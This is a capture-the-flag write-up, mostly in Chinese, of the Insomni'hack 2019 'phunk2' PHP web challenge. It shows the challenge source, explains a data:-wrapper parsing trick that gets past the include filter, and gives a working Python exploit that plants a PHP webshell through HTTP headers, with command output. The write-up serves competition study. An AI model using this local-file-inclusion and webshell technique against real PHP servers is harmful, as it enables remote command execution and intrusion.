---
uuid: 582cd6cc-d14f-44ad-96c8-36ce8ebf3842
title: Insomni'hack teaser 2019 - phunk2
tags:
  - writeup 
  - web
  - php
categories:
  - Capture The Flag
  - Insomni'hack teaser 2019
date: 2019-01-31 00:00:00
updated: 2019-01-31 00:00:00
---

利用 wrapper 對字串解析的不同來成功 getshell

<!--more-->

# [正文]
題目一開始就給出 source code 和 [phpinfo.php](http://phuck.teaser.insomnihack.ch/phpinfo.php)!


{% codeblock source code lang:php http://phuck.teaser.insomnihack.ch/?hl http://phuck.teaser.insomnihack.ch/?hl line_number:true %}
stream_wrapper_unregister('php');
if(isset($_GET['hl'])) highlight_file(__FILE__);

$mkdir = function($dir) {
    system('mkdir -- '.escapeshellarg($dir));
};
$randFolder = bin2hex(random_bytes(16));
$mkdir('users/'.$randFolder);
chdir('users/'.$randFolder);

$userFolder = (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
$userFolder = basename(str_replace(['.','-'],['',''],$userFolder));

$mkdir($userFolder);
chdir($userFolder);
file_put_contents('profile',print_r($_SERVER,true));
chdir('..');
$_GET['page']=str_replace('.','',$_GET['page']);
if(!stripos(file_get_contents($_GET['page']),'<?') && !stripos(file_get_contents($_GET['page']),'php')) {
    include($_GET['page']);
}

chdir(__DIR__);
system('rm -rf users/'.$randFolder);
{% endcodeblock %}

## Analysis
1. 先觀察 `phpinfo` 重要的兩項，`allow_url_include` 和 `allow_url_fopen`
    {% codeblock lang:plain line_number:false %}
    Directive           Local Value	    Master Value
    allow_url_fopen	    On	            On
    allow_url_include   Off	            Off`
    {% endcodeblock %}

2. 再來觀察 source code，首先可以發現 Wrapper `php://` 被關閉。
    {% codeblock lang:php line_number:true first_line:1 %}
    stream_wrapper_unregister('php');
    {% endcodeblock %}

3. `$mkdir` 的 `system` 有加入 `escapeshellarg($dir)` 基本上是死路。
    {% codeblock lang:php line_number:true first_line:4 mark:5 %}
    $mkdir = function($dir) {
        system('mkdir -- '.escapeshellarg($dir));
    };
    {% endcodeblock %}

4. 看起來可以透過 `$_SERVER['HTTP_X_FORWARDED_FOR']` 控制 `$userFolder`。再來會把 `$_SERVER` array 的內容都 dump 進 `$userFolder/profile` 裡面。
    {% codeblock lang:php line_number:true first_line:11 mark:4 %}
    $userFolder = (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
    $userFolder = basename(str_replace(['.','-'],['',''],$userFolder));

    $mkdir($userFolder);
    chdir($userFolder);
    file_put_contents('profile',print_r($_SERVER,true));
    {% endcodeblock %}

5. 看起來可以控制 `$_GET['page']`，不過 `allow_url_include` 被關閉了不能輕鬆地 LFI
    {% codeblock lang:php line_number:true first_line:18 mark:4 %}
    $_GET['page']=str_replace('.','',$_GET['page']);
    if(!stripos(file_get_contents($_GET['page']),'<?') && !stripos(file_get_contents($_GET['page']),'php')) {
        include($_GET['page']);
    }
    {% endcodeblock %}

6. 全部跑完後會把產生的所有東西都刪除。
    {% codeblock lang:php line_number:true first_line:23 mark:4 %}
    chdir(__DIR__);
    system('rm -rf users/'.$randFolder);
    {% endcodeblock %}

## Get shell

`allow_url_fopen on, allow_url_include off`， data warper 會有以下性質
{% codeblock lang:php line_number:false %}
file_get_contents( 'data:,QAQ/profile' );
-> allow_url_fopen   on  => get 'QAQ/profile' file contents

include( 'data:,QAQ/profile' );
-> allow_url_include off => get 'data:,QAQ/profile' file contents
{% endcodeblock %}

透過前面的觀察，可以創建一個 `data:,aaaa/profile`，然後 `file_get_contents()` 會去嘗試得到 `aaaa/profile` 這個不存在的檔案的內容，成功 bypass，且 `include()` 會成功 include `data:,aaaa/profile`。至於檔案的內容 `print_r($_SERVER,true)`，可以透過傳送 http header 來送進去。

## payload

{% codeblock lang:python line_number:true %}
#!/usr/bin/env python3

import requests, sys

headers = {
    "X-Forwarded-For": "data:,QAQ",
    "Webshell": "<?php system('"+ sys.argv[1] +"'); ?>"
}

url = "http://phuck.teaser.insomnihack.ch"
payload = { "page": "data:,QAQ/profile" }
r = requests.get( url, headers=headers, params=payload )
print(r.text)
{% endcodeblock %}

{% codeblock lang:shell line_number:false %}
$ python payload.py 'ls /'
...
    [HTTP_WEBSHELL] => bin
boot
dev
etc
flag
get_flag
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
...
$ python payload.py '/get_flag'
...
    [HTTP_WEBSHELL] => INS{PhP_UrL_Phuck3rY_h3h3!}
...
{% endcodeblock %}

FLAG: `INS{PhP_UrL_Phuck3rY_h3h3!}`
